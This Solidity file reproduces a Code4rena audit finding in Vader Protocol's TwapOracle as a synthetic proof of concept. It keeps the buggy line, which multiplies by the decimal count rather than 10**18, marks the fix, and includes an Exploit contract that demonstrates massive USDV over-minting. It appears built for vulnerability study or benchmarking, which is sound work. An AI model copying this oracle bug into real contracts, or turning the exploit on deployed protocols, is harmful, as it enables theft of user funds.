// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
    Vader Protocol — H-04 TwapOracle calculates the VADER:USDV rate with the
    token's decimal COUNT rather than its decimal SCALE (Code4rena 2021-11,
    finding #42334, WatchPug).

    SYNTHETIC, CHEATCODE-FREE reduction.  The vulnerable calculation is kept
    verbatim.  In this reduced mint path the oracle returns VADER per USDV;
    minting divides a VADER deposit by that price.  A 1:1 18-decimal pair must
    report 1e18, but the bug reports 18, so a one-VADER deposit receives
    1e18 / 18 times too much USDV.
*/

interface IERC20Metadata {
    function decimals() external view returns (uint8);
}

contract MockERC20 is IERC20Metadata {
    string public name;
    string public symbol;
    uint8 public immutable override decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Reduced TWA oracle.  `sumUSD/sumNative` is 1 for the synthetic
///         one-to-one VADER/USDV market, so correct code returns 10**18.
contract TwapOracle {
    function vaderUSDV(address token, uint256 sumUSD, uint256 sumNative) external view returns (uint256 result) {
        // The audited TwapOracle.sol L156 expression is preserved verbatim.
        result = ((sumUSD * IERC20Metadata(token).decimals()) / sumNative); // @> VULN: multiplies by 18, not 10**18, collapsing the price scale
        // FIX: result = ((sumUSD * (10 ** IERC20Metadata(token).decimals())) / sumNative);
    }

    function correctVaderUSDV(address token, uint256 sumUSD, uint256 sumNative) external view returns (uint256) {
        return (sumUSD * (10 ** IERC20Metadata(token).decimals())) / sumNative;
    }
}

/// @notice Reduced mint path: it consumes VADER and mints USDV using the
///         VADER-per-USDV oracle rate.  Dividing by a price that is 18 instead
///         of 1e18 causes extreme USDV over-minting.
contract USDVMinter {
    uint256 public constant WAD = 1e18;
    MockERC20 public immutable vader;
    MockERC20 public immutable usdv;
    TwapOracle public immutable oracle;

    constructor(MockERC20 _vader, MockERC20 _usdv, TwapOracle _oracle) {
        vader = _vader;
        usdv = _usdv;
        oracle = _oracle;
    }

    function mintUSDV(uint256 vaderIn) external returns (uint256 usdvOut) {
        vader.transferFrom(msg.sender, address(this), vaderIn);
        uint256 vaderPerUSDV = oracle.vaderUSDV(address(vader), WAD, WAD);
        usdvOut = (vaderIn * WAD) / vaderPerUSDV;
        usdv.mint(msg.sender, usdvOut);
    }
}

/// @notice Attacker/deployer.  CREATE order: VADER (1), USDV (2), TwapOracle
///         (3), USDVMinter (4).  `run` ends by asserting the concrete minting
///         harm, so it is directly recordable by the Playground.
contract Exploit {
    uint256 public constant ONE_VADER = 1e18;
    MockERC20 public vader;
    MockERC20 public usdv;
    TwapOracle public oracle;
    USDVMinter public minter;
    uint256 public badRate;
    uint256 public correctRate;
    uint256 public usdvMinted;

    constructor() {
        vader = new MockERC20("Vader", "VADER", 18); // CREATE nonce 1
        usdv = new MockERC20("Vader USD", "USDV", 18); // CREATE nonce 2
        oracle = new TwapOracle(); // CREATE nonce 3
        minter = new USDVMinter(vader, usdv, oracle); // CREATE nonce 4
        vader.mint(address(this), ONE_VADER);
    }

    function run() external {
        badRate = oracle.vaderUSDV(address(vader), 1e18, 1e18);
        correctRate = oracle.correctVaderUSDV(address(vader), 1e18, 1e18);
        vader.approve(address(minter), ONE_VADER);
        usdvMinted = minter.mintUSDV(ONE_VADER);

        require(badRate == 18, "bad rate must be decimal count");
        require(correctRate == 1e18, "correct rate must be decimal scale");
        require(usdvMinted == (ONE_VADER * 1e18) / 18, "incorrect mint amount");
        require(usdvMinted > ONE_VADER * 1e12, "minting harm not demonstrated");
    }
}
